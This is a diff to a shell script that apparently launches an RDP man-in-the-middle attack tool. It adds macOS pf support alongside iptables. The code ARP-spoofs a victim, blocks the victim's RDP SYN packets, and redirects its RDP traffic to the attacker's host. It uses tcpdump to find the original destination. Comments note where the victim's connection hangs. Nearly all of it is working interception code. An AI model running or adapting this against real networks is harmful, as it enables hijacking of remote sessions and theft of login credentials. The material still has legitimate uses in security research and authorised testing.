@@ -31,28 +31,28 @@ OS=$(uname -s)
 # Setup requirements based on OS
 # Darwin (MacOS) uses pf as the packet filter module
 # while Linux uses iptables
-#
-# Note: dsniff seems to be abandoned
-# TODO: implement own arpspoofer, or relay on something currently maitained eg: bettercap
-# TODO: Allow use of a custom openssl version by path
 if [ "$OS" == "Darwin" ];
 then
-    echo "[*] Darwin OS detected, switching from iptables to pf"
-
-    for com in tcpdump arpspoof openssl pfctl ; do
-        command -v "$com" >/dev/null 2>&1 || {
-            echo >&2 "$com required, but it's not installed.  Aborting."
-            exit 1
-        }
-    done
+    echo "[*] Darwin OS detected, using pfctl as the netfilter interpreter"
+    NETFILTER_INTERPRETER=pfctl
+elif [ "$OS" == "Linux" ];
+then
+    echo "[*] Linux OS detected, using iptables as the netfilter interpreter"
+    NETFILTER_INTERPRETER=iptables
 else
-    for com in tcpdump arpspoof openssl iptables ; do
-        command -v "$com" >/dev/null 2>&1 || {
-            echo >&2 "$com required, but it's not installed.  Aborting."
-            exit 1
-        }
-    done
+    echo "[*] Cannot determinate netfilter interpreter for "$OS" Kernel. Exit..."
+    exit 1
 fi
+
+# Verify Dependencies
+# Note: dsniff seems to be abandoned
+# TODO: implement own arpspoofer, or relay on something currently maitained eg: bettercap
+for com in awk tcpdump arpspoof openssl $NETFILTER_INTERPRETER ; do
+    command -v "$com" >/dev/null 2>&1 || {
+        echo >&2 "$com required, but it's not installed.  Aborting."
+        exit 1
+    }
+done
 
 # Setup variables from cli
 IFACE="$1"
@@ -116,30 +116,21 @@ set_iptables_2 () {
 
 # Define function to add/remove pf rules on the fly for RDP routing and NAT
 set_pf_1 () {
-    # This works but is not able to keep the connection up after authentication
-    echo "rdr pass on en7 proto tcp from "$VICTIM_IP" to any port 3389 -> "$ATTACKER_IP" port 3389" >> $PF_TMP_FILE
+    echo "block drop in on $IFACE proto tcp from $VICTIM_IP to any port 3389 flags S/S" >> $PF_TMP_FILE
 
-    # Only the following entry should be in set_pf_1 to reflect iptables logic
-    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389 flags S/S" >> $PF_TMP_FILE
-    # Only the previous entry should be in set_pf_1 to reflect iptables logic
-  
-    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389" >> $PF_TMP_FILE
-    echo "block drop on en7 proto tcp from "$VICTIM_IP" to any port 88" >> $PF_TMP_FILE
-
-    $PFCTL -qf $PF_TMP_FILE 2> /dev/null 1>&2
+    $PFCTL -qf $PF_TMP_FILE 2>/dev/null 1>&2
 }
 
-# Not used ATM
 set_pf_2 () {
-    rm $PF_TMP_FILE 2> /dev/null 1>&2
+    rm $PF_TMP_FILE 2>/dev/null 1>&2
 
-    echo "rdr pass on en7 proto tcp from "$VICTIM_IP" to "$ORIGINAL_DEST" port 3389 -> "$ATTACKER_IP" port 3389" >> $PF_TMP_FILE
-    echo "pass in on "$IFACE" proto tcp from "$VICTIM_IP" to "$ORIGINAL_DEST" port 3389" >> $PF_TMP_FILE
-    echo "block drop on en7 proto tcp from "$VICTIM_IP" to any port 88" >> $PF_TMP_FILE
-    
-    # Problem is that this reload will truncat the current RDP connection, and rules are not loaded
-    # So we move everything to set_pf_1 until we find a better way to handle this (if it exists)
-    $PF_CTL -qf $PF_TMP_FILE 2> /dev/null 1>&2 &
+    echo "rdr on $IFACE inet proto tcp from $VICTIM_IP to $ORIGINAL_DEST port 3389 -> $ATTACKER_IP" >> $PF_TMP_FILE
+
+    # After vi tim clicks on "OK" in the login dialog, Seth starts an infinite loop triggering the error on seth/main.py:58
+    # Since there's no credentials yet and the connection is not in a dirty state, the loop is infinite and the connection is never established
+    # Victim stucks on "Securing Remote Connection..."
+    # As soon as Seth dies, client is prompted to accept the server certificate and is able to login
+    $PFCTL -qf $PF_TMP_FILE 2>/dev/null 1>&2
 }
 
 # Declare a finish function to cleanup the system
@@ -149,21 +140,25 @@ function finish {
     if [ "$OS" == "Darwin" ];
     then
         echo "[*]" $(sysctl net.inet.ip.forwarding=0)
+        echo "[*]" $(sysctl net.inet.icmp.bmcastecho=1)
+        # Flush everything from pf queues
+        $PFCTL -qF all 2>/dev/null 1>&2
+
+        # If PF was disabled, disable it, otherwise reload the default conf file
         if [ "$PF_STATUS" == "Disabled" ];
         then
-            $PFCTL -qf all 2> /dev/null 1>&2
-            $PFCTL -qd 2> /dev/null 1>&2
+            $PFCTL -qd 2>/dev/null 1>&2
         else
             $PFCTL -qf $PF_CONF_FILE
         fi
-        rm $PF_TMP_FILE 2> /dev/null 1>&2
+        rm $PF_TMP_FILE 2>/dev/null 1>&2
     else
-        set_iptables_1 D 2> /dev/null 1>&2
-        set_iptables_2 D 2> /dev/null 1>&2
+        set_iptables_1 D 2>/dev/null 1>&2
+        set_iptables_2 D 2>/dev/null 1>&2
         printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
     fi
-    kill -9 $ARP_PID_1 2> /dev/null 1>&2
-    kill -9 $ARP_PID_2 2> /dev/null 1>&2
+    kill -9 $ARP_PID_1 2>/dev/null 1>&2
+    kill -9 $ARP_PID_2 2>/dev/null 1>&2
     pkill -P $$
 
     # Clear certificate in caso of emergency
@@ -196,6 +191,7 @@ echo "[*] Turning on IP forwarding..."
 if [ "$OS" == "Darwin" ];
 then
     echo "[*]" $(sysctl net.inet.ip.forwarding=1)
+    echo "[*]" $(sysctl net.inet.icmp.bmcastecho=0)
     echo "[*] Set pf rules for SYN packets..."
     set_pf_1 2>/dev/null 1>&2 &
 else
@@ -210,7 +206,7 @@ echo "[*] Waiting for a SYN packet to the original destination..."
 ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
     "tcp[tcpflags] ==  tcp-syn" and \
     src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
-    | sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/')"
+    | awk '{print $5}' | sed 's/.3389.*//')"
 
 if [ -z "$ORIGINAL_DEST" ];
 then
@@ -232,9 +228,7 @@ CERTPATH="$(printf "%s" "$CERT_KEY" | tail -n1)"
 if [ "$OS" == "Darwin" ];
 then
     echo "[*] Adjust pf rules for all packets..."
-    # This is commented for the reason explained above, until we find a better way to handle this
-    # As said above, right now everything is done inside the set_pf_1 function
-    #set_pf_2 2>/dev/null 1>&2 &
+    set_pf_2 2>/dev/null 1>&2 &
 else
     echo "[*] Adjust iptables rules for all packets..."
     set +e
